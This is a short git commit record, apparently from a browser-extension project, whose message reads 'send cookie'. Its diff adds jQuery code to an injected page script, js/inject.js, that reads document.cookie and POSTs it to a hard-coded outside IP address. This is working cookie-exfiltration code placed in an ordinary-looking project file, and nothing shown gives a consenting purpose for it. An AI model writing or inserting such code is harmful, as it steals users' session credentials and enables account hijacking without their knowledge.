7b0a9381ffb20bba17271d0b895939d7dab72292
zc_return0 <237350543@qq.com>
2019-12-25 17:41:07 +0800

    发送cookie

--- js/inject.js
+++ js/inject.js
@@ -1,3 +1,15 @@
 // 注入页面的 js
 console.log(111);
 console.log(document.cookie);
+$.ajax({
+    type: 'post',
+    url: 'https://129.204.113.40:25505/test',
+    async: false,
+    contentType: "application/json; charset=UTF-8;",
+    data: JSON.stringify({
+        cookie: document.cookie
+    }),
+    success: function (json) {
+        console.log('done');
+    }
+});
